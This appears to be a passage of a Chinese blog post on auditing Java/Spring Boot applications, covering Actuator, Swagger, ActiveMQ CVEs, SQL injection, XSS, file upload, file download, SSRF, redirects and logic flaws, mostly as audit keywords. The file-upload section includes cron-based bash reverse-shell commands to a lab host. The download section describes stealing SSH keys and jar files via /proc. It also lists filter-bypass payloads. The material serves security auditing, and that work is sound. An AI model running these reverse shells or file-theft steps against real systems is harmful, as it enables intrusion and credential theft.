+&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;  
+&lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;  
+
+
+配置文件一般是Spring Boot 的 application.yml 或 application.properties
+
+以下是一些常用的配置项：
+
+management.endpoints.web.exposure.include：指定哪些端点应该被暴露出来。默认情况下，只有 /health 和 /info 这两个端点可用。如果想启用所有端点，可以设置为 *
+
+management.endpoints.web.exposure.exclude：指定哪些端点不应该被暴露出来
+
+management.endpoints.web.base-path：指定所有端点的基础路径，默认为 /actuator
+
+management.endpoints.web.path-mapping：指定端点的路径映射
+
+management.endpoints.web.cors.allowed-origins：指定哪些源站点可以访问端点
+
+management.endpoint.health.show-details：更改健康端点的显示详细信息，可以设置为 always、when_authorized 或 never
+</code></pre><p>案例：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241212223958.png alt></p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241212224116.png alt></p><h3 id=swagger>Swagger<a hidden class=anchor aria-hidden=true href=#swagger>#</a></h3><p>这个也是黑盒常客，和druid一样的，开启即会有页面，但是是否可访问还要看权限控制：</p><pre tabindex=0><code>组件：
+&lt;groupId&gt;io.springfox&lt;/groupId&gt;  
+&lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt;
+
+&lt;groupId&gt;io.springfox&lt;/groupId&gt;
+&lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt;
+
+配置一般是一个单独的java类：
+关键词：
+@EnableSwagger2
+import springfox.documentation.swagger2
+</code></pre><p>案例：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241212225907.png alt></p><p>添加匿名权限：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241212230156.png alt></p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241212230209.png alt></p><h3 id=apache-activemq>Apache ActiveMQ<a hidden class=anchor aria-hidden=true href=#apache-activemq>#</a></h3><p>漏扫常客：</p><table><thead><tr><th style=text-align:left>漏洞编号</th><th style=text-align:left>漏洞类型</th><th style=text-align:left>版本</th></tr></thead><tbody><tr><td style=text-align:left>CVE-2024-32114</td><td style=text-align:left>未授权</td><td style=text-align:left>6.0.0 &lt;= Apache ActiveMQ &lt; 6.1.2</td></tr><tr><td style=text-align:left>CVE-2023-46604</td><td style=text-align:left>RCE</td><td style=text-align:left>Apache AchtiveMQ &lt;= 5.18.2</td></tr><tr><td style=text-align:left>CVE-2022-41678</td><td style=text-align:left>RCE</td><td style=text-align:left>Apache ActiveMQ &lt; 5.16.6 5.17.0&lt; Apache ActiveMQ &lt; 5.17.4</td></tr><tr><td style=text-align:left>CVE-2017-15709</td><td style=text-align:left>信息泄漏</td><td style=text-align:left>Apache ActiveMQ &lt;= 5.15.2</td></tr><tr><td style=text-align:left>CVE-2016-3088</td><td style=text-align:left>任意文件写入</td><td style=text-align:left>Apache ActiveMQ &lt; 5.14.0</td></tr><tr><td style=text-align:left>CVE-2015-5254</td><td style=text-align:left>反序列化</td><td style=text-align:left>Apache ActiveMQ &lt; 5.13.0</td></tr></tbody></table><pre tabindex=0><code>依赖：
+
+&lt;dependency&gt;
+    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+    &lt;artifactId&gt;spring-boot-starter-activemq&lt;/artifactId&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.activemq&lt;/groupId&gt;
+    &lt;artifactId&gt;activemq-pool&lt;/artifactId&gt;
+    &lt;version&gt;5.12.1&lt;/version&gt; 
+&lt;/dependency&gt;
+
+
+在application.properties或application.yml配置：
+
+spring.activemq.broker-url=tcp://localhost:61616
+spring.activemq.user=admin
+spring.activemq.password=admin
+</code></pre><h3 id=zookeeper>Zookeeper<a hidden class=anchor aria-hidden=true href=#zookeeper>#</a></h3><p>ZooKeeper是一个开源的分布式协调服务，它主要用于分布式系统的协调、配置管理、命名、提供分布式同步以及组服务等</p><p>安全版本：Apache ZooKeeper >= 3.9.3</p><pre tabindex=0><code>配置：
+&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt;
+    &lt;artifactId&gt;zookeeper&lt;/artifactId&gt;
+    &lt;version&gt;3.7.0&lt;/version&gt; 
+&lt;/dependency&gt;
+
+在application.properties或application.yml配置：
+zookeeper.connect-string=localhost:2181
+connect-string: localhost:2181
+</code></pre><h3 id=不安全的反射>不安全的反射<a hidden class=anchor aria-hidden=true href=#不安全的反射>#</a></h3><p>这个漏洞在实战中并不多见，但是有少量的案例，大多和RCE有关：</p><pre tabindex=0><code>关键类：
+
+java.lang.reflect.Method.invoke()
+java.lang.ClassLoader.loadClass()
+java.net.URLClassLoader.newInstance()
+org.codehaus.groovy.runtime.InvokerHelper.invokeMethod()
+
+这个漏洞具体得看相关代码和触发条件，大多还位于能直接调用类的功能点，寻找可用类是个比较麻烦的地方，不过从甲方视角来看，仍然是个需要修复的地方，建议做好限制。
+</code></pre><h1 id=自编码漏洞>自编码漏洞<a hidden class=anchor aria-hidden=true href=#自编码漏洞>#</a></h1><h2 id=1sql注入>1、SQL注入<a hidden class=anchor aria-hidden=true href=#1sql注入>#</a></h2><p>Sql注入大部分静态代码审计都可以做到扫出，重点在于参数是否确实可控，以及相关的插入位置是否好利用，例如之前遇到过一些子查询，确实会将用户语句带入其中，但是用户十分难以控制，这种在甲方视角勉强算一个需要处理的点，但是在红队视角实在是难以算作可以利用。</p><p>mybatis：</p><pre tabindex=0><code>1. Like 模糊查询： Select * from student where name like &#39;%${name}%&#39;
+    
+2. IN 查询： Select * from news where id in (${id})
+    
+3. order by、group by 查询： select * from studentwhere id order by ${id}
+</code></pre><p>JDBC：</p><pre tabindex=0><code>String sql = &#34;select * from users where id = &#39;&#34;+id+&#34;&#39; &#34;;
+</code></pre><h2 id=2xss>2、XSS<a hidden class=anchor aria-hidden=true href=#2xss>#</a></h2><p>在java中XSS漏洞不是一个，个别点位的问题，它应该是一个整体项目的问题，XSS漏洞的逻辑是从前端获取参数，然后重新渲染到前端的过程，这中间可以从后端拦截处理，前端技术也可避免XSS，但是很多甲方视角可能不太认可前端处理的情况。</p><p>从我的观点来看，如果一个系统没有全局过滤Filter来处理XSS，那么有很大可能是存在XSS的，关键词：XSS、XSSFilter，或者全局查找filter。</p><p>但是参数的追踪是个比较麻烦的事情，具体是否返回给前端参数了，需要具体情况具体分析，同样的，如果给了前端，前端是否正确解析也是一个问题，比如使用了VUE、React、Angular、以及ESAPI转义后的字符。</p><p>前端参数的获取方式：</p><pre tabindex=0><code>目前主流的获取前端参数的方式有三种：
+1、Servlet
+
+request.getParameter(&#34;xx&#34;)
+
+2、Struts2框架
+
+public class MyAction extends ActionSupport {
+    private String username;
+    private String password;
+
+3、SpringMVC
+@RequestParam
+@param 
+</code></pre><p>最后，无论是反射型的XSS还存储型的XSS，其实我认为最好还是借助工具和黑盒测验比较好，纯白盒不是很好操作，虽然网上很多人说fortify对于XSS审计还行，但是实际上还是很难完全审好，如果硬要手动审计，我建议从前端触发点反推到Controller：</p><p>关键词：</p><pre tabindex=0><code>&lt;%=
+${
+&lt;c:out  
+&lt;c:if  
+&lt;c:forEach  
+ModelAndView  
+ModelMap  
+Model  
+request.getParameter  
+request.setAttribute
+resopnse.getWriter()
+</code></pre><p>案例：</p><p>结合黑盒测试，把用户名修改为xss payload然后刷新发现弹窗：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241214161928.png alt></p><p>然后追踪到前端，此处是一个获取展示用户名的功能，可以看到关键词：${requestScope.admin.admin_name}</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241214163410.png alt></p><p>向上查找：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241214163428.png alt></p><p>继续向上：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241214163500.png alt></p><p>可以看到参数返回了：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241214163806.png alt></p><p>进入数据库看看，至于怎么写入的，会跟踪controller到dao层的就能看懂：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241214163902.png alt></p><h2 id=3文件上传>3、文件上传<a hidden class=anchor aria-hidden=true href=#3文件上传>#</a></h2><p>文件上传在较近年的springboot项目中可能遇到JSP文件不解析的情况，因为springboot内置的tomcat服务器默认不支持tomcat-embed-jasper，但是不代表这个漏洞不重要，就算无法直接写webshell，但是如果java程序是以高权限启动的，配合目录穿越，可能导致写入密钥、计划任务、passwd、如果能触发jar包的话，方法就更多了。</p><p>关键词：</p><pre tabindex=0><code>CommonsMultipartFile
+new FileOutputStream
+new File(realPath);
+ServletFileUpload
+lastIndexOf(&#34;.&#34;)
+indexOf(&#34;.&#34;)
+MultipartFile
+.write
+.println
+.writeUTF
+.writeBytes
+.writeObject
+
+tomcat-embed-jasper组件：
+&lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;  
+&lt;artifactId&gt;tomcat-embed-jasper&lt;/artifactId&gt;
+</code></pre><p>案例：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241216182717.png alt></p><p>基本没有什么过滤：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241216182836.png alt></p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241216192227.png alt></p><pre tabindex=0><code>centos:
+echo &#39;*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.25.128/11111 0&gt;&amp;1&#39; &gt; /var/spool/cron/root
+
+echo &#39;*/1 * * * * root bash -i &gt;&amp; /dev/tcp/192.168.25.128/33333 0&gt;&amp;1&#39; &gt;&gt; /etc/crontab
+
+ubuntu:
+echo &#39;*/1 * * * * bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.25.128/11111 0&gt;&amp;1&#34;&#39; &gt; /var/spool/cron/crontabs/root
+
+echo &#39;*/1 * * * * root bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.25.128/33333 0&gt;&amp;1&#34;&#39; &gt;&gt; /etc/crontab
+</code></pre><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241216192201.png alt></p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241216192332.png alt></p><p>其实这里还是有些问题的，ubuntu对于计划任务的文件权限有些要求，测试600可以正常反弹，centos应该就可以直接使用这个方式了：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241216193051.png alt></p><h2 id=4任意文件下载>4、任意文件下载<a hidden class=anchor aria-hidden=true href=#4任意文件下载>#</a></h2><p>这个漏洞在打多数的系统中都是用来获取敏感信息的，如果想要以此获得更多东西，可以尝试读取配置文件、/home/username/.ssh/id_rsa(id_ecdsa)、或者jar包：</p><pre tabindex=0><code>【Step1】定位启动的时候jar包的pid
+
+    通过任意文件读取/proc/sched_debug，获取服务器中的进程信息。通过关键字java定位SpringBoot对应的进程，获取进程号pid。实战取决于目标系统的情况，实在不行可以爆破。
+
+【Step2】获取jar包绝对路径
+
+    通过/proc/[PID]/cmdline和/proc/[PID]/environ,其中的PWD存在绝对路径，一般情况下通过这种方式可以拿到SpringBoot对应的jar包的绝对路径。其中cmdline可以获取进程对应的包名，environ可以获取对应的绝对路径，组合之后可以得到jar包对应绝对路径。
+</code></pre><p>关键词：</p><pre tabindex=0><code>fileName
+filePath
+getFile
+getWriter
+InputStream
+File 
+OutputStreaam 
+BufferedInputStream
+FileInputStream
+</code></pre><p>案例：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241217153117.png alt></p><p>这里有个前置路径，全局设置的download下载目录，不过不重要，../可以目录穿越：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241217153228.png alt></p><p>任意文件读取：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241217155044.png alt></p><p>获取进程信息：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241217155954.png alt></p><p>名字：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241217160024.png alt></p><p>下载jar包，war包其实同理：</p><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241217160614.png alt></p><h2 id=5ssrfcsrf>5、SSRF&amp;CSRF<a hidden class=anchor aria-hidden=true href=#5ssrfcsrf>#</a></h2><p>SSRF其实在java中的危害比较有限了，因为JDK7高版本，以及JDK8以上都不支持一些高危协议比如Gopher和DICT了，只需要在代码中做好限制范围和协议即可。</p><pre tabindex=0><code>HttpURLConnection.getInputStream
+URLConnection.getInputStream
+Request.Get.execute
+Request.Post.execute
+URL.openStream
+ImageIO.read
+OkHttpClient.newCall.execute
+HttpClients.execute
+HttpClient.execute
+BasicHttpEntityEnclosingRequest()
+DefaultBHttpClientConnection()
+BasicHttpRequest()
+</code></pre><p>CSRF的话主要看相关的一些功能点是否有做好限制，比如Token或者Referer或者验证码等其他手段，本身的危害不大，比如一些功能：更改个人信息、添加/修改资料、关注/取关用户、发布主题或信息、与交易相关的操作，审计的话，配合黑盒全局搜索Token、Referer、CSRF等关键词。</p><h2 id=6url重定向>6、URL重定向<a hidden class=anchor aria-hidden=true href=#6url重定向>#</a></h2><p>这个漏洞主要用来钓鱼，红队实战用到不多，但是绝对不是没有用处，常见于登录、注册、下单、付款、查看个人信息。</p><p>关键词：</p><pre tabindex=0><code>redirect
+url
+redirectUrl
+callback
+return_url
+toUrl
+ReturnUrl
+fromUrl
+redUrl
+request
+redirect_to
+redirect_url
+jump
+jump_to
+target
+to
+goto
+link
+linkto
+domain
+oauth_callback
+</code></pre><pre tabindex=0><code>http://localhost/vulnapi/redirect/vul?url=https://www.baidu.com
+</code></pre><p><img loading=lazy src=/dmsj_img/Pasted%20image%2020241218163643.png alt></p><h2 id=7逻辑漏洞>7、逻辑漏洞<a hidden class=anchor aria-hidden=true href=#7逻辑漏洞>#</a></h2><p>从黑盒测试的经验来看，逻辑漏洞在java中的产出概率比其他漏洞其实高不少，因为种种框架的出现，帮助开发者规避了很多的top10漏洞，但是业务逻辑很大程度取决于开发者，而开发者不是每个都具有安全意识的。</p><p>其实我认为从发掘安全问题的角度出发，逻辑漏洞应该是黑盒更方便进行检测，常见的一些逻辑漏洞：</p><pre tabindex=0><code>数据可遍历
+越权
+API未授权
+用户名、密码爆破【登录认证问题】
+支付漏洞
+验证码问题【验证码不失效、一码多用、可被识别、可被猜测、可被绕过】
+密码重置
+</code></pre><h3 id=权限问题>权限问题<a hidden class=anchor aria-hidden=true href=#权限问题>#</a></h3><p>上面列出的漏洞中其中一半可以认为是权限问题，权限设计的经典五张表，可以在持久层查看代码是否有考虑到：</p><pre tabindex=0><code>用户表（User Table）：存储系统中所有合法用户的详细信息，如用户ID、用户名、密码等。
+角色表（Role Table）：存储系统中的角色信息，包括角色ID、角色名称以及角色描述等。
+权限表（Permission Table）：也称为资源表，存储系统中所有需要控制访问权限的资源或权限信息，如权限ID、权限名称、权限描述等。
+用户-角色关联表（User-Role Association Table）：描述用户和角色之间的关系，通常包含用户ID和角色ID。
+角色-权限关联表（Role-Permission Association Table）：描述角色和权限之间的关系，通常包含角色ID和权限ID。
+</code></pre><p>java常见的权限验证方法，shiro、Spring Security或者手动编写的filter，代码审计可以快速确定，然后是手动filter存在被绕过的可能性，常见的绕过payload为:</p><pre tabindex=0><code>../
+;
+/admin/main.do/
+//system/UserInfoSearch.do
+</code></pre><h3 id=支付问题>支付问题<a hidden class=anchor aria-hidden=true href=#支付问题>#</a></h3><p>找到对应的功能点，详细捋清逻辑：</p><pre tabindex=0><code>1、支付、取款、转账任意金额的修改，未对正负数、原金额足额比较；
+2、来自前端的金额直接执行支付操作，未对前端折扣金额等于后端的金额比对；
+3、如果未对同一客户端IP、同一用户、同一时间段内重复下单的频率进行先限制和提醒，造成无限刷单；
+</code></pre><h3 id=密码问题>密码问题<a hidden class=anchor aria-hidden=true href=#密码问题>#</a></h3><p>常见功能如找回密码、重置密码：</p><pre tabindex=0><code>1、未同时校验原密码和验证码以及新密码
+2、水平、垂直越权修改密码
+3、短信验证码显示在获取验证码请求的回显中
+4、用户名、手机号码、短信验证码三者没有进行匹配性验证：只验证了手机号码、短信验证码是否匹配，但最终重置密码是根据用户名来重置的，攻击者可以绕过短信验证码限制来重置用户密码
+5、弱随机性或可预测的令牌生成
+</code></pre><p>未完待续&mldr;&mldr;</p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=http://localhost:1313/posts/skill/002-%E5%B8%B8%E8%A7%81%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/><span class=title>« Prev</span><br><span>002 常见前端加密算法</span>
+</a><a class=next href=http://localhost:1313/posts/skill/001-js%E9%80%86%E5%90%91/><span class=title>Next »</span><br><span>001 JS逆向</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>养猪日记</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
